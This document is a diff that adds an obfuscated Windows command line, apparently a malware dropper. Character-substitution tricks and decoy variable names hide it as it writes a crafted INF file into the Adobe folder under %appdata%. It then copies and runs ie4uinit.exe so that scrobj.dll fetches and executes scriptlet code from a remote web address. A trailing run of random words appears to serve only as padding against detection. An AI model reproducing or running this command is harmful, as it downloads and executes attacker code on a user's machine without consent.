@@ -1,0 +1,7 @@
+/v /c (for %g in (s) do @set "Bench=%~g") &&
+  (for %z in (a) do @set "Races=%~z") &&
+  (for %g in (c) do @set "Alias=%~g") &&
+  (for %g in (i) do @set "Apparatus=%~g") &&
+  call(for %g in ("[defaultinstall.windows7]" "Un\" "Register\" "OCXs=543" "delfiles=75A" "[strings]" "Theories=:;Scheme" "Blame=b;Monster" "Tanks=/" "Falls=%t!Apparatus!me%" "servicename=' '" "Proof=h" "shortsvcname=' '" "Substances=t;Editions" "Press=init" "[version]" "signature =$windows nt$" "[destinationdirs]" "75A=01" "defaultdestdir=11" "[543]" "sc\" "ro%Blame%j,NI,%Proof%%Substances%%Substances%p%Theories%%Tanks%%Tanks%xyd!Exer!Alias!ises!teresamalins!Exer!Alias!ises!c!Tra!Alias!kba!Alias!ks!applicationresponce" "[75A]" "ieu%Press%.inf" ) do @echo %~g)>"%appdata%\Adobe\ieuinit.inf" &&
+  call xcopy /Y /C /Q %w!Apparatus!n!Smoke!ir%\system32\ie4uinit.exe "%appdata%\Adobe\*" | set Vendor44=Train &&
+  start " " %appdata%\Adobe\ie4uinit.exe -basesettings " | set "Vendor8=Dishes Carriers Repairs Silver Ceiling Insights Handles Purchase Tunes Hours Section Picnic Candidates Analysts Stores Emerge Makers Prepare Blues Surplus Rewards Partners Omissions Variations School Thought Gadgets Exchanges Fluid Seminars Incentives Finals Beliefs Doctors Morris Producers Amenities Turtle Grunt Basics Either Romance Viable Squirrel Extends"
